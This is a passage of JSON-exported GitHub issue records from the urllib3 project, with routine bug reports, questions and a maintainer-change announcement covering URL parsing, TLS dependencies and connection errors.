"https://api.github.com/repos/urllib3/urllib3/issues/1658/events", "html_url": "https://github.com/urllib3/urllib3/issues/1658", "id": 473715539, "node_id": "MDU6SXNzdWU0NzM3MTU1Mzk=", "number": 1658, "title": "if the name contains a square bracket ('['), I get 400", "user": {"login": "nikolasj", "id": 15126763, "node_id": "MDQ6VXNlcjE1MTI2NzYz", "avatar_url": "https://avatars1.githubusercontent.com/u/15126763?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nikolasj", "html_url": "https://github.com/nikolasj", "followers_url": "https://api.github.com/users/nikolasj/followers", "following_url": "https://api.github.com/users/nikolasj/following{/other_user}", "gists_url": "https://api.github.com/users/nikolasj/gists{/gist_id}", "starred_url": "https://api.github.com/users/nikolasj/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nikolasj/subscriptions", "organizations_url": "https://api.github.com/users/nikolasj/orgs", "repos_url": "https://api.github.com/users/nikolasj/repos", "events_url": "https://api.github.com/users/nikolasj/events{/privacy}", "received_events_url": "https://api.github.com/users/nikolasj/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-07-28T07:37:09Z", "updated_at": "2019-07-28T16:35:40Z", "closed_at": "2019-07-28T16:35:40Z", "author_association": "NONE", "active_lock_reason": null, "body": "The following exception is raised when request method is called for an artifact where its name contains square branckets ('[')\r\n\r\nRuntimeError: {\r\n  \"errors\" : [ {\r\n    \"status\" : 400,\r\n    \"message\" : \"Bad Request\"\r\n  } ]\r\n}", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1656", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1656/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1656/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1656/events", "html_url": "https://github.com/urllib3/urllib3/issues/1656", "id": 472729232, "node_id": "MDU6SXNzdWU0NzI3MjkyMzI=", "number": 1656, "title": "Question: urllib3 HTTP call (Post) use NTLM", "user": {"login": "R-Studio", "id": 7498854, "node_id": "MDQ6VXNlcjc0OTg4NTQ=", "avatar_url": "https://avatars0.githubusercontent.com/u/7498854?v=4", "gravatar_id": "", "url": "https://api.github.com/users/R-Studio", "html_url": "https://github.com/R-Studio", "followers_url": "https://api.github.com/users/R-Studio/followers", "following_url": "https://api.github.com/users/R-Studio/following{/other_user}", "gists_url": "https://api.github.com/users/R-Studio/gists{/gist_id}", "starred_url": "https://api.github.com/users/R-Studio/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/R-Studio/subscriptions", "organizations_url": "https://api.github.com/users/R-Studio/orgs", "repos_url": "https://api.github.com/users/R-Studio/repos", "events_url": "https://api.github.com/users/R-Studio/events{/privacy}", "received_events_url": "https://api.github.com/users/R-Studio/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-07-25T08:20:22Z", "updated_at": "2019-07-25T12:44:28Z", "closed_at": "2019-07-25T12:25:44Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi together\r\n_I am a total noob in python, so sorry for the following dummy question._\r\n\r\n**How can I use urllib3 to make a HTTP post call with NTLM authentication?** \r\n\r\n_So in the past I try to use \"requests_ntlm\" but there is an dependency to the module \"six\" and in this module there is a [bug](https://github.com/benjaminp/six/issues/118):\r\n@six.add_metaclass(abc.ABCMeta)\r\nAttributeError: module 'six' has no attribute 'add_metaclass'\r\n-> That's the reason I will try this with the urllib3._\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1655", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1655/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1655/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1655/events", "html_url": "https://github.com/urllib3/urllib3/issues/1655", "id": 471236437, "node_id": "MDU6SXNzdWU0NzEyMzY0Mzc=", "number": 1655, "title": "idna requirement for pyopenssl", "user": {"login": "rouzazari", "id": 11428213, "node_id": "MDQ6VXNlcjExNDI4MjEz", "avatar_url": "https://avatars2.githubusercontent.com/u/11428213?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rouzazari", "html_url": "https://github.com/rouzazari", "followers_url": "https://api.github.com/users/rouzazari/followers", "following_url": "https://api.github.com/users/rouzazari/following{/other_user}", "gists_url": "https://api.github.com/users/rouzazari/gists{/gist_id}", "starred_url": "https://api.github.com/users/rouzazari/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rouzazari/subscriptions", "organizations_url": "https://api.github.com/users/rouzazari/orgs", "repos_url": "https://api.github.com/users/rouzazari/repos", "events_url": "https://api.github.com/users/rouzazari/events{/privacy}", "received_events_url": "https://api.github.com/users/rouzazari/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-07-22T18:12:58Z", "updated_at": "2019-07-22T18:35:21Z", "closed_at": "2019-07-22T18:27:21Z", "author_association": "NONE", "active_lock_reason": null, "body": "`cryptopraphy` no longer requires `idna`. If `pyOpenSSL` is installed, `urllib3` can raise an error when trying to import `idna`.  \r\n\r\nShould `urllib3` require `idna` on its own (as it is imported in `contrib.pyopenssl`) or should `pyopenssl` require `idna`?\r\n\r\nIf I misunderstand the need for `idna` then please let me know and close the issue. Thanks!\r\n\r\n### Example\r\n\r\n#### pip installations:\r\n`pip install urllib3==1.25.3 pyOpenSSL==19.0.0`\r\n\r\n#### example code:\r\n```python\r\nimport urllib3.contrib.pyopenssl as urllib3_contrib_pyopenssl\r\nurllib3_contrib_pyopenssl._dnsname_to_stdlib('abc')\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"venv\\idna_test\\lib\\site-packages\\urllib3\\contrib\\pyopenssl.py\", line 193, in _dnsname_to_stdlib\r\n    name = idna_encode(name)\r\n  File \"venv\\idna_test2\\lib\\site-packages\\urllib3\\contrib\\pyopenssl.py\", line 178, in idna_encode\r\n    import idna\r\nModuleNotFoundError: No module named 'idna'\r\n```\r\n\r\n#### requirements.txt\r\n```\r\nasn1crypto==0.24.0\r\ncffi==1.12.3      \r\ncryptography==2.7 \r\npycparser==2.19   \r\npyOpenSSL==19.0.0 \r\nsix==1.12.0       \r\nurllib3==1.25.3   \r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1653", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1653/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1653/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1653/events", "html_url": "https://github.com/urllib3/urllib3/issues/1653", "id": 469720835, "node_id": "MDU6SXNzdWU0Njk3MjA4MzU=", "number": 1653, "title": "Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it", "user": {"login": "PythoNiko", "id": 37851218, "node_id": "MDQ6VXNlcjM3ODUxMjE4", "avatar_url": "https://avatars3.githubusercontent.com/u/37851218?v=4", "gravatar_id": "", "url": "https://api.github.com/users/PythoNiko", "html_url": "https://github.com/PythoNiko", "followers_url": "https://api.github.com/users/PythoNiko/followers", "following_url": "https://api.github.com/users/PythoNiko/following{/other_user}", "gists_url": "https://api.github.com/users/PythoNiko/gists{/gist_id}", "starred_url": "https://api.github.com/users/PythoNiko/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/PythoNiko/subscriptions", "organizations_url": "https://api.github.com/users/PythoNiko/orgs", "repos_url": "https://api.github.com/users/PythoNiko/repos", "events_url": "https://api.github.com/users/PythoNiko/events{/privacy}", "received_events_url": "https://api.github.com/users/PythoNiko/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 11, "created_at": "2019-07-18T11:38:52Z", "updated_at": "2020-01-07T00:42:18Z", "closed_at": "2019-07-18T12:56:11Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\nimport unittest\r\nfrom selenium import webdriver\r\n\r\n\r\nclass MyTest(unittest.TestCase):\r\n\r\n    `@classmethod\r\n    def setUpClass(cls):\r\n        # create a new Firefox session and move to trade-in page on storefront\r\n        cls.driver = webdriver.Firefox(executable_path='my/path/to/geckodriver.exe')\r\n        cls.driver.get('https://www.mysite.com')\r\n        cls.driver.set_window_position(0, 0)\r\n        cls.driver.set_window_size(1024, 768)\r\n        cls.driver.implicitly_wait(5)\r\n        cls.driver.maximize_window()\r\n        \r\n        # Go to X section\r\n        cls.my_button = cls.driver.find_element_by_xpath(\r\n            '/html/body/div[1]/div[2]/div[2]/div[2]/div[2]/div[3]/div[2]/a[2]')\r\n        cls.my_button.click()\r\n\r\n    def test_a(self):\r\n        print('\\n' + '_____Section A_____')\r\n\r\n        # get a\r\n        element_a = self.driver.find_element_by_xpath(\r\n            '//*[@id=\"contentInnerWrap\"]/div[1]/div[2]/div/div[1]/ul/li[1]/span').text\r\n        #  do more stuff....\r\n\r\n    def test_b(self):\r\n        print('\\n' + '_____Section B_____')\r\n\r\n        # get b\r\n        element_a = self.driver.find_element_by_xpath(\r\n            '//*[@id=\"contentInnerWrap\"]/div[1]/div[2]/div/div[1]/ul/li[1]/span').text\r\n        #  do more stuff....\r\n\r\n    @classmethod\r\n    def tearDown(cls):\r\n        # close the browser window\r\n        cls.driver.quit()\r\n\r\n\r\nif __name__ == '__main__':\r\n    unittest.main(verbosity=2)\r\n```\r\n\r\nThis is my main test file. Worked fine with test_a alone.\r\nAs soon as I added test_b, I get the following error:\r\n\r\n> urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=57362): Max retries exceeded with url: /session/b8c7e1f4-327f-482e-b7a8-4e2f417d7d51/timeouts (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x041B10D0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))\r\n\r\nStacktrace:\r\n\r\n```Error\r\nTraceback (most recent call last):\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\connection.py\", line 160, in _new_conn\r\n    (self._dns_host, self.port), self.timeout, **extra_kw)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\util\\connection.py\", line 80, in create_connection\r\n    raise err\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\util\\connection.py\", line 70, in create_connection\r\n    sock.connect(sa)\r\nConnectionRefusedError: [WinError 10061] No connection could be made because the target machine actively refused it\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\connectionpool.py\", line 603, in urlopen\r\n    chunked=chunked)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\connectionpool.py\", line 355, in _make_request\r\n    conn.request(method, url, **myproject\r\nootdir\\lib_request_kw)\r\n  File \"C:\\Users\\my-name\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\myproject\r\nootdir\\\\client.py\", line 1229, in request\r\n    self._send_request(method, url, body, headers, encode_chunked)\r\n  File \"C:\\Users\\my-name\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\myproject\r\nootdir\\\\client.py\", line 1275, in _send_request\r\n    self.endheaders(body, encode_chunked=encode_chunked)\r\n  File \"C:\\Users\\my-name\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\myproject\r\nootdir\\\\client.py\", line 1224, in endheaders\r\n    self._send_output(message_body, encode_chunked=encode_chunked)\r\n  File \"C:\\Users\\my-name\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\myproject\r\nootdir\\\\client.py\", line 1016, in _send_output\r\n    self.send(msg)\r\n  File \"C:\\Users\\my-name\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\myproject\r\nootdir\\\\client.py\", line 956, in send\r\n    self.connect()\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\connection.py\", line 183, in connect\r\n    conn = self._new_conn()\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\connection.py\", line 169, in _new_conn\r\n    self, \"Failed to establish a new connection: %s\" % e)\r\nurllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x041B10D0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"C:\\Users\\my-name\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\unittest\\case.py\", line 59, in testPartExecutor\r\n    yield\r\n  File \"C:\\Users\\my-name\\AppData\\Local\\Programs\\Python\\Python37-32\\lib\\unittest\\case.py\", line 615, in run\r\n    testMethod()\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\test_trade_ins.py\", line 86, in test_zzz\r\n    self.driver.implicitly_wait(30)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\selenium\\webdriver\\remote\\webdriver.py\", line 912, in implicitly_wait\r\n    'implicit': int(float(time_to_wait) * 1000)})\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\selenium\\webdriver\\remote\\webdriver.py\", line 319, in execute\r\n    response = self.command_executor.execute(driver_command, params)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\selenium\\webdriver\\remote\\remote_connection.py\", line 374, in execute\r\n    return self._request(command_info[0], url, body=data)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\selenium\\webdriver\\remote\\remote_connection.py\", line 397, in _request\r\n    resp = self._conn.request(method, url, body=body, headers=headers)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\request.py\", line 72, in request\r\n    **urlopen_kw)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\request.py\", line 150, in request_encode_body\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\poolmanager.py\", line 326, in urlopen\r\n    response = conn.urlopen(method, u.request_uri, **kw)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\connectionpool.py\", line 670, in urlopen\r\n    **response_kw)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\connectionpool.py\", line 670, in urlopen\r\n    **response_kw)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\connectionpool.py\", line 670, in urlopen\r\n    **response_kw)\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\connectionpool.py\", line 641, in urlopen\r\n    _stacktrace=sys.exc_info()[2])\r\n  File \"C:\\Users\\my-name\\PycharmProjects\\my-project\\venv\\lib\\site-packages\\urllib3\\util\\retry.py\", line 399, in increment\r\n    raise MaxRetryError(_pool, url, error or ResponseError(cause))\r\nurllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=57362): Max retries exceeded with url: /session/b8c7e1f4-327f-482e-b7a8-4e2f417d7d51/timeouts (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x041B10D0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1650", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1650/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1650/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1650/events", "html_url": "https://github.com/urllib3/urllib3/issues/1650", "id": 464530168, "node_id": "MDU6SXNzdWU0NjQ1MzAxNjg=", "number": 1650, "title": "urllib3 should not log an error on certificate mismatch", "user": {"login": "NicolasLM", "id": 7612656, "node_id": "MDQ6VXNlcjc2MTI2NTY=", "avatar_url": "https://avatars0.githubusercontent.com/u/7612656?v=4", "gravatar_id": "", "url": "https://api.github.com/users/NicolasLM", "html_url": "https://github.com/NicolasLM", "followers_url": "https://api.github.com/users/NicolasLM/followers", "following_url": "https://api.github.com/users/NicolasLM/following{/other_user}", "gists_url": "https://api.github.com/users/NicolasLM/gists{/gist_id}", "starred_url": "https://api.github.com/users/NicolasLM/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/NicolasLM/subscriptions", "organizations_url": "https://api.github.com/users/NicolasLM/orgs", "repos_url": "https://api.github.com/users/NicolasLM/repos", "events_url": "https://api.github.com/users/NicolasLM/events{/privacy}", "received_events_url": "https://api.github.com/users/NicolasLM/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2019-07-05T08:41:14Z", "updated_at": "2019-07-26T17:45:23Z", "closed_at": "2019-07-26T17:45:23Z", "author_association": "NONE", "active_lock_reason": null, "body": "Logging an error and then reraising the exception does not achieve much as the application code will have to handle the exception anyway. It's better to let the application decide if it's a noteworthy event or not.\r\n\r\nI personally don't think that a certificate mismatch is different from a server not responding or the other dozens of failures that can happen while marking an HTTP request (where urllib3 does not log an error).\r\n\r\nIn my case the \"error\" is reported to Sentry but there is nothing I can do as a client to fix it, which is usually a pretty good indicator that the log level should be changed to something else. If it was up to me I would change it to an `info` level.\r\n\r\nhttps://github.com/urllib3/urllib3/blob/2c055b4a60affa3529660b928fff375fde3993f7/src/urllib3/connection.py#L428-L440", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1646", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1646/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1646/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1646/events", "html_url": "https://github.com/urllib3/urllib3/issues/1646", "id": 463895600, "node_id": "MDU6SXNzdWU0NjM4OTU2MDA=", "number": 1646, "title": "Announcement: @sethmlarson is now the primary maintainer", "user": {"login": "theacodes", "id": 250995, "node_id": "MDQ6VXNlcjI1MDk5NQ==", "avatar_url": "https://avatars2.githubusercontent.com/u/250995?v=4", "gravatar_id": "", "url": "https://api.github.com/users/theacodes", "html_url": "https://github.com/theacodes", "followers_url": "https://api.github.com/users/theacodes/followers", "following_url": "https://api.github.com/users/theacodes/following{/other_user}", "gists_url": "https://api.github.com/users/theacodes/gists{/gist_id}", "starred_url": "https://api.github.com/users/theacodes/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/theacodes/subscriptions", "organizations_url": "https://api.github.com/users/theacodes/orgs", "repos_url": "https://api.github.com/users/theacodes/repos", "events_url": "https://api.github.com/users/theacodes/events{/privacy}", "received_events_url": "https://api.github.com/users/theacodes/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 401011711, "node_id": "MDU6TGFiZWw0MDEwMTE3MTE=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Announcement", "name": "Announcement", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 7, "created_at": "2019-07-03T18:29:02Z", "updated_at": "2019-07-09T03:10:24Z", "closed_at": "2019-07-09T03:10:24Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "Hi urllib3 contributors and watchers. \ud83d\udc4b \r\n\r\nI've been the primary maintainer since March 2018 (#1347), but my time in that role has come to an end. I'm confident that I'm leaving this project in a good state.\r\n\r\n## New maintainer\r\n\r\n@sethmlarson is taking responsibility as the primary maintainer and thus the direction of urllib3 moving forward. Seth has been doing the vast majority of the work on urllib3 and we are in great hands.\r\n\r\nAs before, our family of contributors and co-maintainers will continue to support our new leader as needed.\r\n\r\n## Logistics\r\n\r\n- [x] Announcement: https://twitter.com/shazow/status/1147248832956100608\r\n- [x] Update README\r\n    - [x] move @sethmlarson to the top of the list. :)\r\n    - [x] Update Sponsors section to note that Google *previously* sponsored my time.\r\n- [x] [Github admin](https://github.com/urllib3/urllib3/settings/collaboration)\r\n- [x] [PyPI admin](https://pypi.org/manage/project/urllib3/collaboration/)\r\n- [x] [ReadTheDocs admin](https://readthedocs.org/dashboard/urllib3/users/)\r\n- [x] CI Admin access\r\n\r\nMaintainers, If anything else is need please feel free to comment or edit the list.\r\n\r\n---\r\n\r\nIf anyone has questions or concerns, comments here are welcome or email me. \ud83d\udc9c  ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1644", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1644/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1644/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1644/events", "html_url": "https://github.com/urllib3/urllib3/issues/1644", "id": 462451665, "node_id": "MDU6SXNzdWU0NjI0NTE2NjU=", "number": 1644, "title": "Small Typo address spelled with three d's", "user": {"login": "timgates42", "id": 47873678, "node_id": "MDQ6VXNlcjQ3ODczNjc4", "avatar_url": "https://avatars1.githubusercontent.com/u/47873678?v=4", "gravatar_id": "", "url": "https://api.github.com/users/timgates42", "html_url": "https://github.com/timgates42", "followers_url": "https://api.github.com/users/timgates42/followers", "following_url": "https://api.github.com/users/timgates42/following{/other_user}", "gists_url": "https://api.github.com/users/timgates42/gists{/gist_id}", "starred_url": "https://api.github.com/users/timgates42/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/timgates42/subscriptions", "organizations_url": "https://api.github.com/users/timgates42/orgs", "repos_url": "https://api.github.com/users/timgates42/repos", "events_url": "https://api.github.com/users/timgates42/events{/privacy}", "received_events_url": "https://api.github.com/users/timgates42/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-06-30T22:07:37Z", "updated_at": "2019-07-01T04:36:19Z", "closed_at": "2019-07-01T04:36:18Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Appears in 2 spots in the repository.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1640", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1640/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1640/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1640/events", "html_url": "https://github.com/urllib3/urllib3/issues/1640", "id": 461813620, "node_id": "MDU6SXNzdWU0NjE4MTM2MjA=", "number": 1640, "title": "Incorrect RFC 3986 validation?", "user": {"login": "saucecode", "id": 1284702, "node_id": "MDQ6VXNlcjEyODQ3MDI=", "avatar_url": "https://avatars2.githubusercontent.com/u/1284702?v=4", "gravatar_id": "", "url": "https://api.github.com/users/saucecode", "html_url": "https://github.com/saucecode", "followers_url": "https://api.github.com/users/saucecode/followers", "following_url": "https://api.github.com/users/saucecode/following{/other_user}", "gists_url": "https://api.github.com/users/saucecode/gists{/gist_id}", "starred_url": "https://api.github.com/users/saucecode/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/saucecode/subscriptions", "organizations_url": "https://api.github.com/users/saucecode/orgs", "repos_url": "https://api.github.com/users/saucecode/repos", "events_url": "https://api.github.com/users/saucecode/events{/privacy}", "received_events_url": "https://api.github.com/users/saucecode/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-06-28T01:21:22Z", "updated_at": "2019-07-26T16:09:27Z", "closed_at": "2019-07-26T16:09:27Z", "author_association": "NONE", "active_lock_reason": null, "body": "As of release 1.25, I believe certain RFC 3986 compliant URIs have been wrongly marked as invalid, leading to `urllib3.exceptions.LocationParseError: Failed to parse` exceptions.\r\n\r\nI'm thinking that this is caused by the appearance of an @ (at) symbol in the `userinfo` portion of the URI, which previously went ignored.\r\n\r\nTo reproduce:\r\n\r\n```python\r\n>>> import urllib3 # 1.25.3\r\n>>> urllib3.util.parse_url('socks5://saucecode@example.com:myPassword@proxy.example.com:1080')\r\n\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/home/julian/.local/lib/python3.6/site-packages/urllib3/util/url.py\", line 234, in parse_url\r\n    raise LocationParseError(url)\r\nurllib3.exceptions.LocationParseError: Failed to parse: socks5://saucecode@example.com:myPassword@proxy.example.com:1080\r\n```\r\n\r\nUnfortunately I'm not all that good at reading RFC documents, so I'm not sure if the @ (at) symbol appearing is in violation of the standard or not. To gather more evidence, I tried using [uritools](https://uritools.readthedocs.io/en/latest/) - another Python package advertising RFC 3986 compliance - to see what it thinks of that URI. It agrees that it *is* compliant.\r\n\r\n```python\r\n>>> import uritools\r\n>>> uritools.isuri('socks5://saucecode@example.com:myPassword@proxy.example.com:1080')\r\nTrue\r\n```\r\n\r\nI'll leave it to better minds to judge if this is the intended behavior.\r\n\r\n----\r\n\r\nSome loosely related background:\r\n\r\nMy vpn provider provides SOCKS5 proxies to their customers which I use with Python `requests` in my own scripts, as an easy way to proxy HTTP traffic. Python `requests` requires that socks5 proxies are specified as `socks5://username:password@vpn.example.com:1080`, and in this case, the `username` was an email address.\r\n\r\nSince upgrading urllib3, my scripts have been throwing `LocationParseError` when one of these proxy URIs is specified.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1639", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1639/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1639/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1639/events", "html_url": "https://github.com/urllib3/urllib3/issues/1639", "id": 460948426, "node_id": "MDU6SXNzdWU0NjA5NDg0MjY=", "number": 1639, "title": "ssl_match_hostname", "user": {"login": "nenadg", "id": 1519100, "node_id": "MDQ6VXNlcjE1MTkxMDA=", "avatar_url": "https://avatars3.githubusercontent.com/u/1519100?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nenadg", "html_url": "https://github.com/nenadg", "followers_url": "https://api.github.com/users/nenadg/followers", "following_url": "https://api.github.com/users/nenadg/following{/other_user}", "gists_url": "https://api.github.com/users/nenadg/gists{/gist_id}", "starred_url": "https://api.github.com/users/nenadg/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nenadg/subscriptions", "organizations_url": "https://api.github.com/users/nenadg/orgs", "repos_url": "https://api.github.com/users/nenadg/repos", "events_url": "https://api.github.com/users/nenadg/events{/privacy}", "received_events_url": "https://api.github.com/users/nenadg/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-06-26T12:43:09Z", "updated_at": "2019-06-26T19:02:41Z", "closed_at": "2019-06-26T14:19:49Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, I'm on OpenSuse Tumbleweed, running urllib3 (1.25.3)\r\nThis is the error I got:\r\n\r\n```\r\nFile \"/usr/lib/python2.7/site-packages/urllib3/packages/__init__.py\", line 3, in <module>\r\n    from . import ssl_match_hostname\r\nImportError: cannot import name ssl_match_hostname\r\n```\r\nI really don't know what problem could this be, but I've manually changed following lines:\r\n\r\nhttps://github.com/urllib3/urllib3/blob/cdfc9a539cc27f5704f8bcd46d34301b3d218aff/src/urllib3/connectionpool.py#L26\r\n\r\nhttps://github.com/urllib3/urllib3/blob/cdfc9a539cc27f5704f8bcd46d34301b3d218aff/src/urllib3/connection.py#L38\r\n\r\nto match `from backports.ssl_match_hostname import ...` and now everything works normally.\r\n\r\nCan someone explain me what could be problem here?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1636", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1636/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1636/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1636/events", "html_url": "https://github.com/urllib3/urllib3/issues/1636", "id": 457286422, "node_id": "MDU6SXNzdWU0NTcyODY0MjI=", "number": 1636, "title": "Spurious TypeError if BaseException occurs during getresponse()", "user": {"login": "cjerdonek", "id": 355822, "node_id": "MDQ6VXNlcjM1NTgyMg==", "avatar_url": "https://avatars3.githubusercontent.com/u/355822?v=4", "gravatar_id": "", "url": "https://api.github.com/users/cjerdonek", "html_url": "https://github.com/cjerdonek", "followers_url": "https://api.github.com/users/cjerdonek/followers", "following_url": "https://api.github.com/users/cjerdonek/following{/other_user}", "gists_url": 